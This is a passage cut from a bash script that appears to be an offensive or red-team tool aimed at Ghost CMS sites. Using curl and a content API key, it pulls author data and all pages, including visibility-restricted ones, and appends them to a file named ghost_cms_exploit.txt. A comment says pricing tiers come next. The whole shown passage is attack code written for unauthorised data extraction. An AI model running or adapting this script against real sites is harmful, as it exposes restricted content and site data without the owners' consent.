        [ -n "$authors" ] && echo "GHOST AUTHORS: $authors" >> "$SESSION/rt/ghost_cms_exploit.txt"

        # Extract pages (including visibility-restricted)
        local pages=$(curl -sk --max-time 15 "https://${target}/ghost/api/content/pages/?key=${api_key}&limit=all&status=all" 2>/dev/null)
        [ -n "$pages" ] && echo "GHOST PAGES: $pages" >> "$SESSION/rt/ghost_cms_exploit.txt"

        # Extract tiers/pricing
